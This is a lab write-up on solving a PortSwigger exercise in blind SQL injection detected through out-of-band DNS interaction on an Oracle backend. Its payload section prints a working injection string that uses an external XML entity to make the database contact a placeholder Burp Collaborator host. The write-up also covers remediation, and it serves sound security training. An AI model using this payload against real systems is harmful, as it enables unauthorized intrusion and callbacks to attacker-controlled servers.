# Lab 15 — Blind SQL injection with out-of-band interaction

**Category:** SQL Injection
**Difficulty:** Practitioner
**Reference:** https://portswigger.net/web-security/sql-injection/blind

## Objective
Neither response content, errors, nor timing give any signal. Confirm the injection using an out-of-band (OAST) DNS lookup to Burp Collaborator.

## Vulnerability
Injectable `TrackingId` cookie on an Oracle backend that supports triggering DNS lookups via XML external entity evaluation inside `EXTRACTVALUE`/`XMLTYPE`.

## Steps to Reproduce
1. Generate a unique Burp Collaborator payload / subdomain.
2. Inject a payload that forces the Oracle database to resolve that subdomain via an XXE-style DNS lookup.
3. Check the Collaborator client for an incoming DNS interaction to confirm the injection fired out-of-band.

## Payload(s) Used
```
TrackingId=x'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
```

## Explanation
Oracle's XML parser will attempt to resolve the external entity's URL, which includes a unique Collaborator subdomain. A DNS lookup arriving at Burp Collaborator for that subdomain proves the injected SQL executed server-side, even though the HTTP response itself carries zero observable difference.

## Screenshots
_Add your screenshots here, e.g. `./screenshots/sqli-lab-15-01.png`_

## Remediation
Disable or restrict DB features that allow network callbacks (e.g. XML external entity resolution, `UTL_HTTP`), apply egress filtering from the database host, and use parameterized queries.

---
*Lab solved on PortSwigger Web Security Academy. Writeup by Miley.*
